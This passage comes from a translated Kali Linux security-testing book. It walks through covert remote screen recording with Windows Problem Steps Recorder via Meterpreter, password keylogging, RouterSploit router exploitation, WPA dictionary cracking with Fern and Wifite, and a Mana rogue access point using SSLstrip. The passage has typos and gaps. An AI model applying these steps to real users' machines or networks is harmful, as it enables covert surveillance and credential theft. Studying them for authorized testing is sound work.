目标解锁了工作站并输入了他们的密码“password”，我们能够在 Metasploit 中看到这个密码。尽管我们过去也注意到，对于较长的密码，某些字符似乎被截断了。但对于一个几年前编写的程序来说，它运行得非常完美。接下来，我想查看一个每个 Windows 7 版本中都内置的内置工具，它可以作为一种远程屏幕捕取和活动日志记录工具。

## 使用“步骤记录器（Step Recorder）”作为远程工具

Windows 包含一个非常棒的辅助程序，你可能听过它，被称为“问题记录器”（PSR）。微软制作此程序是为了帮助故障排除人员逐步查看用户正在进行的操作。如果用户遇到了无法描述或技术支持无法直可视化的计算机问题，所有支持人员只需要运行 PSR 即可。当 PSR 运行时，它会自动开始捕获用户点击的所有内容，还会记录用户正在执行的操作。完成后，数据将保存为 HTML 格式并压缩，用户只需将其发送给技术部门即可。老实说，我以前没听说过 PSR，直到一段时间在 Twitter 上有人提到该工具的措辞从隐私角度来看有点令人担忧。确实很毛骨悚然，但我想如果你可以远程运行它，它将是渗透测试的绝佳工具。嗯，你确实可以！虽然将 PSR 作为攻击手段并不是新主意，但我搜索发现，多年来它多次以这种方式被提到。要正常使用“步骤记录器”，你只需要点击 Windows 中的开始按钮，并在搜索框中输入“psr”。然后点击“步骤记录器”或直接运行“psr.exe”。当你这样做时，会弹出一个小型界面：点击“开始”。PSR 随后会立即开始截图。每当拍摄截图时，它都会显示一个红色指针。完成后按“停止录制”。你将看到一份关于你所做一切的精美报告。然后你还可以选择保存该报告。

## 使用 Metploit 远程使用 PSR

在安全测试环境中，通过命令行，PSR 与 Metasploit 配合得非常好。有几种方法我们可以通过 Metasploit 使用自动化脚本使用 PSR，我将向你展示手动方法。我们将从 Windows 7 虚拟机与我们的 Kali Linux 系统之间的一个活动会话开始：

- 输入“shell”进入命令提示符。
- 输入“psr /start /gui 0 output [路径]”如下：

```
meterpreter > shell
Process 3720 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan\Desktop>psr /start /gui 0
```

- 3. 在 Windows 7 系统上打开浏览器进行浏览。
- 4. 浏览几秒钟后，输入“psr /stop”。

上面的命令启动了 PSR，运行 (/gui 0) 时会弹出一个窗口，录制时显示红色指针。输入 "/stop” 命令后，文件将以“cool.zip”的形式保存到桌面。此时 Windows 7 桌面上会出现一个新文件。该文件包含了截图，底部是详细的操作步骤文本日志：

Problem Step 1: 用户在“Mozilla Firefox - Start Page”中输入
Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
UI Elements: Mozilla Firefox - Mozilla Window

Problem Step 2: 用户点击“puppies - Yahoo Search Results”
Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
UI Elements: Search Results - Mozilla firefox

Problem Step 3: 用户点击“Sad Puppy - Wallpaper (972648)”
Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
UI Elements: Yahoo Search Results - Sad Puppy

Problem Step 4: 用户在“Sad Puppy Wallpaper”上点击“浏览器标签页（工具栏）”
Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
UI Elements: Browser tabs, Sad Puppy Wallpaper (972648) - Mozilla

Problem Step 5: 用户点击“桌面（列表）”“程序管理器”
Program: Windows Explorer, 6.1.7601.16368 (with_ru9701325), Microsoft Corporation
UI Elements: Desktop, FolderView, SysListView, Program Manager

通过几个命令，我们就能使用问题记录器捕获远程测试！现在我使用 PSR 比 Metasploit 内置的截图功能还要好。特别是包含了详细的操作日志。你可以让这种攻击变得更高级。例如，我创建了一个包含以下命令的文件：

```
psr.exe /start /gui 0 /output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20
psr.exe/stop
```

如前，第一个命令启动 PSR。“Start-Sleep -s 20”命令让脚本在执行停止之前暂停20秒。然后我对文本文件进行了 Base64 编码（基于 PowerShell 的攻击在我的《Kali Linux 高级安全测试》书中有详细介绍），并在命令提示符中作为 PowerShell 命令运行它：




每天或由系统事件启动和停止。这些是更高级的功能，我留给读者去进一步探索。

## 结论

在本节中，我们演示了如何在 Kali 中使用 Metasploit 从远程系统捕获击键。我们还发现，键盘记录器通常不会记录登录密码，因为 Windows 登录服务使用了不同的键盘缓冲区。但如果我们将键盘记录器移动到该进程中，我们确实可以捕获到登录凭据。

我们还介绍了一个实用的程序，它可以将会话迁移到 Winlog 进程，监控系统的空闲时间，将其锁定，并在用户尝试重新登录时捕获密码。`Lockout_Keylogger` 自动化了从开始到结束的整个过程。用户离开电脑，脚本等待特定的空闲时间，然后将计算机设置为锁定模式。接着，当他重新登录时，程序已经设置好扫描所按的按键。

最后，我们涵盖了问题步骤记录器（Problem Steps Recorder）。我们看到这个微软内置的支持工具如何作为一种远程渗透测试工具，提供屏幕截图流和用户操作的分步日志。虽然 PSR 可以在组策略中禁用，但我我没有在任何地方看到如何完全卸载它。

防止此类攻击的最佳防御是从源上阻止远程连接的创建，因此要采用标准的安全规范。保持您的操作系统和杀毒软件更新到最新版本。不要打开未经请求的、意外或可疑的邮件附件。避免可疑链接，警惕短 URL，并始终安全上网。

## 路由器与 Wi-Fi 安全测试

## 第 24 章：无线网络攻击

无线网络和 Wi-Fi 设备从未停止渗透家庭和商业领域。针对 Wi-Fi 网络的威胁已为人知，尽管人们已经做出一些努力来锁定无线网络，但仍有一些网络处于开放状态或安全防护不足。新的 WPA3 标准在实施后将极大增强安全性，但正如安全世界的其他任何事物一样，要预料会有新的战术。猫鼠游戏仍在继续。

在本节中，我们将讨论无线安全和一些常见的 Wi-Fi 误区。我们将查看一些白帽黑客可以用来检查其无线网络安全性的流行工具和技术。有时无线网络可以被修改以欺骗用户，因此我们还将涵盖渗透测试员（不幸的是，黑客）如何使用简单的网卡设置虚假的接入点（AP）。

## 无线安全协议

[消息正在传出，无线制造商正为他们的设备配置更优安全性作为默认设置，但仍有大量无线网络的安全性极其糟糕。保护你的无线网络，最重要的因素之一就是无线安全协议。你有“None（无）”，这基本上意味着你敞开大门让任何人访问你的网络。*WEP* 在很久以前就被破解了，基本上就像是你锁了门，但把钥匙留在了门垫下，还贴了一张大字写着“钥匙在垫下”。“WPA”和“WPA2”好一些，但仍然存在问题。新的“WPA3”是建议采用的网络安全标准。它取代了已有 14 年历史的 WPA2。虽然 WPA3 设备刚刚开始认证和制造，第一批设备应该在 2018 年底或 2019 年初上市。

过去，最大的问题是人们使用开放或 WEP 来保护他们的 Wi-Fi 网络。现在最大的问题是，WPA2 密码在大多数情况下相当容易破解。大多数人在设备上使用简单的密码，并在共享的 Wi-Fi 上基本上定义了一个简单的密码短语。难以置信的是，你仍然看到厂家出的新设备带有极其简单的设备密码。我刚刚收到一个全新的路由器，默认密码竟然是“admin”。黑客正利用人们要么不知道如何更改、要么懒得更改默认密码的漏洞，并利用路由器进行大规模僵尸攻击。他们使用默认密码接管大量路由器，然后将它们用于分布式拒绝服务或其他攻击。 2018 年 6 月，VPNFilter 接管了超过 500,000 台路由器！

你也经常听到在常用路由器中发现严重漏洞的消息。在大多数情况下，它们是网络的第一道防线。因此，我认为花些时间涵盖基于路由器的攻击是很重要的。在本章中，我们将查看针对路由器的几种方法，在接下来的章节中我们将涵盖 Wi-Fi 网络。对于本节，你需要一个能够进入监控模式的无线卡。许多 Wi-Fi 适配器都能做到，但有些不能。如果你计划购买一个，请做些研究，以确定你的 Wi-Fi 适配器是否可以在监控模式下配合 Kali 工作。我将使用 TP-Link-WN722n（版本2 不兼容 Kali）USB Wi-Fi 适配器，它与 Kali 配合得很好。有关 Wi-Fi 适配器如何与 Kali 工作的额外信息，请参阅资源部分。此外，对于本节中的某些测试，使用额外的路由器（如果你手头有一个）可能会更容易。

## 路由器密码与固件更新

在所有设备中，路由器是需要使用长复杂密码进行保护的最重要设备之一。存在许多网站，包含网络设备的默认密码。一个“路过黑客”（寻找容易攻入目标的人）会做的第一件事就是尝试对面向互联网的设备使用默认凭据。不幸的是，很多时候他们确实得逞。



我刚刚点击了 D-Link 一键破解漏洞程序之一，它立即要求设置新密码。如果我输入密码并点击“确定”，它将尝试使用漏洞程序来重置本地 D-Link 路由器的密码。安全专业人员理解其影响至关重要，因为许多漏洞程序在执行时不会向用户请求进一步确认。

如前文所述，该网站似乎已经不再活跃更新了，尽管 Routerwn 的 Twitter 推馈确实有一些关于路由器漏洞的优质推文（https://twitter.com/Routerpn）。接下来，让我们来看 Kali Linux 中一个较新的路由器漏洞利用工具包：“Routerploit”。

## RouterSploit

工具作者：Reverse Shell Security

工具网站：https://github.com/threat9/routersploit

RouterSploit 或路由器漏洞利用框架（Router Exploitation Framework）是一个类似于 Metasploit 的工具，专门用于测试嵌入式设备。它的功能与 Metasploit 一，包含了扫描器、负载（payloads）以及漏洞程序（exploits）。有趣的是，该工具还支持低功耗蓝牙（BLE）。工具网站建议你频繁检查工具更新，因为它正处于深度开发中，并不断添加新功能。

## 安装 RouterSploit

该工具位于 Kali 仓库中，甚至在 Kali 网站上有一个工具页面，但目前 Kali 默认并未安装它。我通常建议用户始终从 Kali 仓库安装工具，手动安装可能会破坏 Kali 或或其他工具。尽管你无法从 Kali 仓库获取最新版本，且由于该工具更新频繁，我是按照工具作者的说明安装的。以下是写本文时的说明，请务必检查工具网页以获取更改：

```
apt-get install python3-pip
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
```

运行该工具的方法：

```bash
python3 rsf.py
```

## RouterSploit

Threat9 开发嵌入式设备漏洞利用框架

```
代号：I Knew You Were Trouble
版本：3.3.0
首页：https://www.threat9.com - @threatnine
加入 Slack 群：https://www.threat9.com/slack
```

加入 Threat9 Beta 测试计划 - https://www.threat9.com

漏洞程序：128 扫描器：4 凭据：165 通用：4 负载：32 编码器：6 rsf >

工具作者建议你频繁更新程序：

在 routersploit 子目录中，执行 "git pull"

## 使用 RouterSploit

该工具的布局与 Metasploit 类似。你可以使用 "show" 命令查看可用选项和模块。选项包括：

- 漏洞程序 (Exploits)
- 信息 (Info)
- 扫描器 (Scanners)
- 凭据 (Creds)
- 字典列表 (Wordlists)
- 编码器 (Encoders)

因此，要查看可用扫描器：

输入 "show scanners"

```
rsf > show scanners
scanners/autopwn
scanners/routers/router_scan
scanners/cameras/camera_scan
scanners/misc/misc_scan
```

所有扫描工具都已列出。

使用某个模块的步骤与 Metasploit 相同：

- 使用模块 (Use the module)
- 显示选项 (Show Options)

## 设置选项

设置负载和其他选项
执行 (Execute)

与 Metasploit 一样，你可以输入 "back" 返回 rsf 提示符，或输入 "exit" 退出。让我们运行路由器扫描器来查看程序是如何工作的。路由器扫描会扫描目标并检查其是否受到 RouterSploit 的漏洞。它还会检查默认密码。

输入 "scanners/routers/router_scan"
然后输入 "show options"

```
rsf > use scanners/routers/router_scan
rsf (Router Scanner) > show options

Target options:
Name | Current settings | Description
|---|---|---|
target | | 目标 IPv4 或 IPv6 地址

Module options:
Name | Current settings | Description
|---|---|---|
htp_port | 80 | 目标 Web 端口
|ttp_ssl | false | 启用 HTTPS: true/false
|ftp_port | 21 | 目标 FTP 端口 (默认: 21) |
```

现在设置你需要的选项。我知道我的路由地址，所以我将填充 target 设置。

set target 192.168.1.1
然后直接输入 "run"

```
rsf (Router Scanner) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Router Scanner) > run
[+] Running module...

[*] Starting vulnerability check...
[+] thread-0 thread is starting...
[+] thread-1 thread is starting...
[+] thread-2 thread is starting...
[+] thread-3 thread is starting...
[+] thread-4 thread is starting...
[-] 192.168.1.1:80 http exploits/generic/heartbleed is not vulnerable
```

如果你正在验证你的路由器是否安全，那么你会在目标路由器上看到如下内容：

```
[-] 192.168.1.1 Could not confirm any vulnerability
[-] 192.168.1.1 Could not find default credentials
```

如果路由器存在漏洞，RouterSploit 将列出可用的漏洞程序以及哪些默认凭据有效。然后你可以使用带有负载的漏洞模块，如果路由器存在远程代码执行漏洞，即可获取远程 shell。

使用漏洞模块：

- 使用漏洞程序 (Use the exploit)
- 设置目标 (Set the target)
- 输入 "check" 检查是否存在漏洞
- 输入 "run" 执行
- 输入 "show payloads" 查看负载
- 设置 LHOST
- 执行漏洞 (Run the exploit)

如果漏洞程序运行，你将获得一个命令行提示符。该工具还支持低功耗蓝牙。工具网站建议你检查更新。它可以监控 Wi-Fi。接下来，让我们看看一些 Wi-Fi 监控工具。

## 使用 Aircrack-ng 查看无线网络

**工具作者：** Thomas, Christophe Devine

**工具网站：** http://www.aircrack-ng.org/

Aircrack-ng 是一些常用的命令行程序。Wi-Fi 工具可以用于监控、测试和破解 Wi-Fi。让我们从 Airmon-ng 开始。

- 1. 首先，你需要插入无线网卡并通过“可移动设备”将其连接到 Kali。
- 2. 接下来，打开终端并输入命令 "ifconfig"。你应该能看到你的网卡为 wlan0：

```
wlan0: flags=4099<UP,BROCAST,MULTICAST> mtu 1500
  ether f8:dl:11:00
RX packets 0 bytes (0.0 B)
RX errors 0 dropped 0 overruns 0
TX packets 0 bytes (0.0 B)
TX errors 0 dropped 0 overruns 0
```

如果接口没有显示，尝试 **ifconfig wlan0 up**。如果仍然不显示，可能是驱动问题。请查看 Kali 论坛获取更多信息。

- 3. 好的，现在我们需要将网卡置于监控模式。只需输入 `airmon-ng start wlan0`。

```
root@kali:~# airmon-ng start wlan0
Found 2 processes that could cause trouble.
If airdump-ng, airplay-ng or air-ng stops working
a short period of time, you may want to run 'airmon-ng check kill'
PID Name
552 NetworkManager
509 wpa_supplicant
PHY Interface Driver Chipset
phyl1 wlan0 ath9k_htc Atheros Communications, Inc. AR9271 802.
(mac80211 monitor mode vif enabled for [phyl1]wlan0 on [phyl1]wlanmon)
(mac80211 station mode vif disabled for [phyl1]wlan0)
```

你可以从上面的图中看到创建一个名为 wlan0mon 的监控接口。其他破解工具将使用这个新接口。你还会看到关于可能引起问题的进程的通知，可以忽略。如果你长期使用 Aircrack-ng，你会发现监控接口的名称发生了变化，它不再是 "mon0" 而是 "wlan0mon"。





| BSSID | PWR Beacons | #Data, #s | CH | MB | ENC | CIPHER | AUTH | ESSID | <length: 10> |
|---|---|---|---|---|---|---|---|---|---|
| 08:60:6E: | -45 | 117 | 2137 | 0 | 11 | 54 | WPA2 | CCMP | PSK | |
| BSSID | STATION | PWR | Lost Frames | Probe | | | | | |
| 08:60:6E: (not associated) | F8:D0:AC:28:C2:0D: | -67 | 48-54 | -61 | 0-1 | 2116 | 5 | | | |

（你可以随时按 "Ctrl-c" 退出到终端提示符。）

Airodump-ng 列出了几处我们感兴趣的信息。首先是 AP 设备的 MAC 地址。接下来是功率、AP 运行的通道号、发送的数据包数量以及加密和身份验证类型。最后，列出了 AP 名称。

从上述内容，你可以看到无线路由器正在使用 "WPA2"，这是标准的加密类型。如果类型是 "WEP" 或 "OPN"（开放），那么将会存在非常大的安全问题。WEP 很久以前就被破解了，而开放则意味着 AP 完全没有设置安全防护，任何人都可以连接它。

如果客户端连接，我们将在 BSSID STATION 部分下看到客户端及其所连接的 AP 的 MAC 地址。因此，你可以看到 Wi-Fi 固有的安全缺陷之一。通过 MAC 地址过滤客户端并不是一种非常有效的安全策略，因为通过物理地址可以很容易地查看哪些客户端连接到了哪些 AP。攻击者只需要查看哪些地址已连接，然后伪造该地址来绕过 MAC 过滤即可！请参阅本章节后半部分的 "macchanger" 命令以查看如何操作。

## 在 Wireshark 中查看 Wi-Fi 数据包和隐藏的 AP

所以，我们已经看到通过 MAC 地址过滤并不是一个极友好的安全选项。另一个常见的 Wi-Fi 误区是，认为将你的无线接入点更改为“隐藏”（Hidden） SSID 会增加你网络的安全性。事实并并非如此，我们将在本节中看到原因。

我们已经见过如何查看哪些 AP 可用，现在让我们看看如何在广流行的协议分析器 Wireshark 中捕获并分析数据包。只需像上一个示例中那样将你的 Wi-Fi 网卡设置为监听模式（monitor mode），然后运行 Wireshark。将网卡设置为监听模式允许我们看到无线管理流量，如 AP Beacons（信标）和 Probes（探测）。

在终端窗口中输入：

```
airmon-ng start wlan0
```

## wireshark &

注意：

当启动 airmon-ng 时，可能会收到一条关于运行进程可能导致问题的消息，这些可以被忽略。在 Wireshark 命令后使用的 "&" 告诉 Kali 运行 Wireshark，但返回命令提示符。最后，Wireshark 中关于以超级用户身份运行的消息此时可以被忽略。

Wireshark 将打开，现在你只需要选择一个要查看数据包的接口并开始捕获。

- 从接口列表中点击 "wlan0mon"。
- 点击 "Star*"（鲨鱼图标）：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_340_0.png)

Wireshark 现在开始从空气中捕获网络数据包，你应该立即看到所有 Wi-Fi Beacon 流量列表。

例如：

- 1 0.000000 Beacon frame, SN=3269, FN=0, SSID=Broadcast
- 2 0.028565 Beacon frame, SN=3318, FN=0, SSID=My Wi-Fi

在这里你可以看到来自两个独立 AP 的捕获。第二个被称为 "My Wi-Fi"，但第一个不同。SSID 是 "Broadcast"，这告诉我们该 AP 的名称是隐藏的。这是一种用于保护无线网络的无效技术，我将为你展示原因。

如果客户端尝试连接到这个隐藏 AP，我们会自动在“Probe Request”（探测请求）中捕获 SSID 名称。检查数据包捕中的“Probe Requests”，我们实际上会看到如下未隐藏的 SSID：

- 93 6.623480 Probe Request, SN=0, FN=0, SSID=Terminator
- 99 7.122094 Probe Response, SN=84, FN=0, SSID=Terminator

那个在 Beacon 帧中未显示的 AP 一旦客户端尝试连接，就会向我们暴露！客户端在探测请求中列出隐藏名称，在本例中为 “Terminator”。而 AP 会在 Probe Response（探测响应）中将其隐藏名称回给客户端。

- 5. 要停止 Wireshark 捕获，只需使用菜单上的“Stop Capture”按钮。然后你可以搜索、过滤或保存结果。
- 6. 点击“File”然后点击“Close”返回主目录。
- 7 你可以关闭 Wireshark。

寻找隐藏接入点名称的另一种方法是让 airodump-ng 运行一段时间（airmon-ng wlanmon），随着客户端的连接，它将解析 AP 名称并显示出来：

| CH | MB | ENC | CIPHER | AUTH | ESSID | BSSID | PWR Beacons | #Data, #s |
|---|---|---|---|---|---|---|---|---|
| 2137 | 0 | 11 | 54 | WPA2 | CCMP | PSK | 08:60:6E: | -45 | 117 |

（注：由于表格表头在原文中错位，此处已根据对应关系进行了整理）





“FBI 想要我们协助杀灭的那个 VPNFilter 僵尸网络？它还活着” - 

https://www.cnet.com/news/that-vpnfilter-router-botnet-the-fbi-wanted-us-to-help-kill-its-still-alive/

访问 Kali 论坛获取 Wi-Fi 新闻和故障排除技巧 - 

https://forums.kali.org/forum.php

“购买 2018 年用于 Wi-Fi 破解的最佳无线网络适配器” - 

https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2018-0178550/

# 第 25 章 Fern WIFI Cracker 与 WiFiite

测试路由器安全性是保护公司资产的重要部分。如果攻击者能够破解无线网络的密码，他们就可以获得公司内部网络的权限。这可能允许他们执行我们在之前的几个章节中讨论过的许多攻击，就像他们直接连接到有线网络一样。这就是为什么加固路由器至关重要的原因。在很多情况下，这意味着要提供强密码，但许多人根本懒得这样做。有些公司甚至会在重要的路由器上留下默认凭据。

Fern WIFI Cracker 和 WiFiite 是极佳的网络安全测试程序。它们都提供了一个易于使用的界面来调用底层的 Acrack-ng 和 Reaver 渗透测试工具。使用这些任何一种工具，我们都可以扫描访问点并攻击无线保护设置 (WPS)。我们还可以使用字典攻击执行菜单驱动的 WEP/ WPA/ WPA 密码破解。在本章中，我们将介绍如何使用 Fern 和 WiFiite 测试无线路由器的安全性。测试将包括使用词列表攻击无线访问密钥，以查看其是否可以被破解。

## 使用 Fern WIFI Cracker

工具作者：Saviour Emmanuel Ekiko
工具网站：https://github.com/savio-code/fern-wifi-cracker

让我们先来看 Fern WIFI Cracker。Fern 的作者还创建了“Ghost Phisher”，尽管 Ghost Phisher 看起来已经不再是一个活跃的项目，并且在当前版本的 Kali 中似乎存在一些功能问题。

要从菜单启动 Fern，导航到“Applications > 06-Wireless Attacks > fern wifi cracker”，或者直接在命令行中输入“fern-wifi-cracker”：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_346_0.png)

- 1. 从下拉列表中选择你的无线接口。

- 2. 然后点击**“Scan for Access points”（扫描访问点）**。
Fern 将开始搜索该区域内的访问点。一旦检测到某些访问点，它们将显示在 WIFI WEP 或 WPA 图标中，如下所示：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_346_2.png)

- 3. 点击 WIFI 图将列出你的网卡在该区域内能看到的每一个访问点：

现在从“Target Access Point”（目标访问点）面板中选择一个访问点。

然后从攻击选项中点击“Regular attack”（常规攻击）或“WPS Attack”（WPS 攻击）。

我选择了我的测试 AP “blink”，点击了“Wireless Protected Setup”（无线保护设置）攻击，最后点击了“WiFi Attack”（WiFi 攻击）。

## WPS 设备支持

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_347_0.png)

Fern 正确检测到我们的 AP 上未启用 WPS。考虑到开启 WPS 的安全风险，我总是会关闭我所有路由器上的 WPS。在某些路由器上，WPS 功能容易受到暴力破解攻击，攻击者可以运行像“Reaver”（Fern 使用的）这样的程序并获得对路由器的访问。如果启用了 WPS，你可以让 Fern 尝试破解 WPS Pin。

由于这不起作用，我们的下一步是尝试对路由器使用的密码密钥进行字典攻击。

- 7. 只需选择“Regular Attack”（常规攻击）。

- 8. 然后点击“Browse”（浏览）按钮并选择要使用的词列表。

在这个示例中，我们将使用在 Fern 的 "/extras/wordlists”文件夹中找到“common.txf”词列表，如下所示：

- 9. 现在点击“Wi-Fi Attack”（Wi-Fi 攻击）按钮。

攻击将尝试词列表中的每个单词来匹配访问点的密码密钥。在我测试的路由器上，它在很短的时间内就找到了密码：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_348_0.png)

WPA KEY: password - 看来这安全防护并不好！

但如果你对使用非常长且复杂的密码的路由器运行字典攻击，将得到这条消息：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_348_1.png)

WPA Key was not found - Please try another wordlist file（请尝试另一个词列表文件）

由于此路由器使用的密码非常独特，即使对它运行一整天的词列表文件也无法破解。这就是为什么在配置路由器和 Wi-Fi 密码时，使用复杂密码如此重要。

## 使用 WiFi 进行 Wi-Fi 测试

**工具作者：**Derv Merkler

**工具网站：**https://github.com/derv82/wifite

现在我们将看看 WiFi，这是一个快速易用的命令行菜单驱动程序，用于发现和测试无线网络安全。WiFi 是另一个在底层使用 Aircrack-ng 工具集、Reaver 以及工具的工具。这使得使用标准的 Wi-Fi 工具简单得多，因为它使用了菜单界面并为你自动化所有的攻击。WiFi 是一个活跃的项目，最近刚刚更新过。

WiFi 位于 Kali 菜单“Applications > 06 - Wireless Attacks > wite”，但点击它只会显示 WiFi 的帮助页面：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_349_0.png)

- 1. 在终端输入“wifite”来启动 WiFi。
- 2. WiFi 将自动开始扫描：

```
root@kali: # wite
https://github.com/derv82/wifite
[+] looking for interfaces
```

- 3. 如果你有多个接口，可以指定它们：

```
root@kali: # wite -i wlan0
[+] looking for interfaces
```

- 4. 现在，让它运行一会儿。当你觉得有了足够的信息时，按下“Ctrl+C”。系统会提示你：

| ESSID | CH | ENCR | POWER |
|---|---|---|---|
| | | | |

- 5. 选择你想要攻击的目标。



```bash
root@kali:~# wifite --wrack --dict /usr/share/wordlists/rockyou.txt
 wifite 2.1.6
 : 自动化无线审计
 https://github.com/derv82/wifite

 [+] 选项：使用字典 /usr/share/wordlists/rockyou.txt 破解 WPA 握手
[-] 列出从 /root/hs 获取的握手包
```

系统会告知你想破解哪个握手文件，然后它会列出你尝试破解该文件时运行的命令。某些程序要求你在破解之前先对握手文件进行处理。系统也会向你提供所需的处理命令。

## 结论

在本节中，我们涵盖了从使用简单密码的路由器获取 Wi-Fi WPA 密钥是多么简单。本章介绍的两种无线测试工具都允许我们快速发现并测试附近的无线网络。这两种攻击都是通过对连接到路由器的用户取消认证（de-authenticating），然后通过字典攻击捕捉并破解 WPA 密钥实现的。最后，我们涵盖了 WiFi 如何提供命令，使用标准破解工具破解更困难的 WPA 密钥。

希望本章展示了发现并访问不安全的 Wi-Fi 路由器是多么容易。选择长且复杂的密码将帮助你的无线网络免受攻击者的侵害。此外，当 WPA3 Wi-Fi 设备可用时，实施它们将对保护无线网络有很大帮助。

## 第 26 章 使用 Mana 进行伪造 WiFi 路由器攻击

Mana
**工具作者：** Sensepost, Dominic White & Ian de Villiers
**工具网站：** https://github.com/sensepost/mana

使用 Wi-Fi 的智能设备也容易受到恶意 WiFi（Rogue Wi-Fi）攻击的影响。如果我们设置一个伪造无线路由器并让目标连接，我们可以看到目标正在进行的一切。如果你运行像 Sensepost 的 Mana这样的程序，你甚至能够看到加密的通信。

> **警告：**
> 如果你想尝试 Mana，我强烈建议你在独立的 Kali Linux 虚拟机副本中安装它。
> 我不建议在用于书中教程的虚拟机上安装 Mana，因为它会进行多项难以撤销的更改。

与其他 Wi-Fi 路由器程序一样，Mana 创建了一个伪造无线路由器，但它的功能远不止于此。Mana 作为用户定义的访问点运行，它还会监听计算机和移动设备寻找首选 Wi-Fi 网络的信标（beacon），它可以伪造这些网络。一旦有人连接到伪造设备，它会自动运行 SSLStrip 将安全通信降级为普通 HTTP，并可以绕过/限制 HSTS。这允许攻击者查看所有的会话数据。Mana 还允许你破解 Wi-Fi 密码、获取登录会话 Cookie，并让你使用 Firelang 伪造这些会话。但这并不是全部；它还可以伪造强制性门户（captive portal），并在没有网络的地方模拟互联网访问。请访问工具网站获取更多信息，并查看 Defcon 22 演讲：

https://youtube.com/i2-jReLBSVk

Mana 使用了 Kali 中已安装的许多工具，工作效果惊人，尽管在写作时，我在让它在最新版本的 Kali 上运行遇到了一些问题。

介绍就此结束，让我们看看 Mana 的运行情况：

要安装 Mana，只需打开终端并输入 `apt-get install mana-toolkit`。

它默认使用 Wi-Fi 适配器 Wlan0，并使用伪造路由器名称“Internet”。如果这没问题，你不需要更改任何内容。这样，你已经准备好运行 Mana 了。我们所只需要运行位于 `/usr/share/mana-toolkit/run-mana` 的一个 Mana 程序脚本。

这些脚本是：

- start-nat-simple.sh
- start-nat-full.sh
- start-nounstream.sh
- start-nounstream-all.sh
- start-nounstream-eaponly.sh
- start-nounstream-eap.sh

在本次练习中，我们将运行 Mana 的主“nat-full”攻击脚本。

1. 输入 `ifconfig` 以确认你的无线网卡：
```bash
root@kali:~ # ifconfig
wlan0      IEEE 802.1bn SSID:off/any
Mode:Manage Access Point:Not-Associated Tx-Power:20 dbm
       Retry start limit:7 RTS thr:off Fragment thr:off
       Encryption key:off
Power Management:off
```

2. 目录到 `/usr/share/mana-toolkit/run-mana`
3. 输入 `./start-nat-full.sh`  Mana。
Mana 随后启动伪造无线路由器、SSLstrip 以及所有其他工具并开始监听流量：

```bash
root@kali:/usr/share/mana-toolkit/run-mana# ./start-nat-full.sh
hostname WRTS5G
nCurrent MAC: 23:23:04:45:67:2d (Bogus Wi-Fi Mac)
Permanent MAC: 23:23:04:45:67:2d (Bogus Wi-Fi Mac)
New MAC: d4:76:bc:2f:21 (unknown)
Configuration file: /etc/mana-toolkit/hostapd-mana.conf
Using interface wlan0 with hardaddr 00:11:00:33:11:00 and ssid "Internet"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
usr/share/mana-toolkit/hostapd-mana.conf
SSLstrip 5.2
Copyright (c) 2009-2018 Daniel
```





## Kismet

工具作者：Mike Kershaw

工具网站：https://www.kismetwireless.net/

如果你只需要扫描你的公司以查看可用的 Wi-Fi 网络并对其其创建一个报告，那么 Kismet 是一个非常棒的工具。Kismet 在发现和记录接入点（AP）及客户端方面表现出色，并以多种格式记录这些日志。虽然你现在很少听说过它，但 Kismet 是用于无线漫游（wardriving）的主要工具之一。

## 使用 Kismet 进行扫描

- 从菜单“Applications > 06 - Wireless Attacks > kismet”启动 Kismet 以查看其输入，或者直接在终端提示符下输入 `kismet`：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_358_0.png)

- 当出现“Kismet is running as root” 消息时，点击“OK”。

- 点击“Yes”启动服务器。

- 在服务器选项（Server Options）界面上，你可以直接使用默认值并选择“Start”，

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_359_0.png)

5. 在“Add a Source Now”提示符处点击“Yes”。

6. 在“Add Source”弹出窗口中，在 `Intf_` 行输入你的无线网卡接口名称。你可以使用 `wlan0`，如果你的 Wi-Fi 网卡已经处于监听模式，甚至可以使用 `mon0`。可选，你可以为你的接口添加一个描述性名称。然后点击“Add”：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_359_1.png)

就这样！Kismet 将开始记录它看到的所有无线设备和数据包。

7. 点击“Close Console Window”按钮关闭控制台界面进入图形界面：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_359_2.png)

起初看起来可能有点混乱，但基本上检测到的网络和设备会显示在左上角。底部图表显示检测到的流量，黄色代表数据包，红色代表数据。你可以使用“View”和“Sort”菜单来决定在屏幕上显示哪些数据以及如何排序。尝试不同的 Sort 选项以熟悉它。

Kismet 运行时间越长，你对周围环境的了解就越深入。

## 注意：

你可能听过“无线漫游（War Driving）”这个术语。基本上这意味着开着 Wi-Fi 监控程序在城市里行驶并获取区域 Wi-Fi 信息。Kismet 是一个经常用于无线漫游的程序。

开车时只需在笔记本电脑上运行 Kismet。添加一个 GPS 源（如手机），Kismet 就会为它发现的每个网络添加 GPS 位置。完成后，你可以创建一个漂亮的区域 Wi-Fi 网络列表。

- 1. 当你觉得 Kismet 运行得足够长时，点击“Kismet”选项然后点击“Quit”。

- 2. 随后你会被询问是否要停止 Kismet 服务器，去点击“Kill”。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_360_0.png)

Kismet 会告诉服务关闭并让我们回到终端提示符。太好了，我们该做什么呢？如果你查看关闭消息，你会发现创建了几个 Kismet 日志：

```
[SERVER] INFO: Closed netml log file 'Kismet-20180731-15-21-18-1.netxml'
